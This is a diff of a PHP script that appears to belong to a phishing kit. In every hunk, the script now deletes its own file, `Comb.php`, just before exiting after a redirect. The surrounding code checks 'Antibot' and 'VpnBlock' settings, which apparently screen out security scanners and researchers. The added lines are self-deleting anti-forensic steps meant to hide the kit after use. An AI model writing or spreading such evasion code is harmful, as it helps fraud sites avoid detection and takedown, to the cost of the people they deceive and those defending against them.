@@ -139,7 +139,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
         }
@@ -170,7 +170,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
 
@@ -199,7 +199,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
 
@@ -233,7 +233,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
 }
@@ -260,7 +260,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
 }
@@ -837,7 +837,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
         }
@@ -1004,7 +1004,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
         }
@@ -1530,7 +1530,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
         }
@@ -1902,7 +1902,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
         }
@@ -1938,7 +1938,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
 	 }
@@ -1978,7 +1978,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
         }
     }
@@ -2014,7 +2014,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
 
         }
@@ -2052,7 +2052,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 
         }
     }
@@ -2100,7 +2100,7 @@ if ($Antibot == "on") {
 }
 
 header("Location: ".$RedirectUrl);
-exit();
+unlink("Comb.php"); exit();
 }
 
 $block = strtolower($VpnBlock);
@@ -2136,7 +2136,7 @@ if ($block == "on") {
             curl_close($ch);
         };
         header("Location: ".$RedirectUrl);
-        exit();
+        unlink("Comb.php"); exit();
     };
 };
  unlink("Comb.php");              
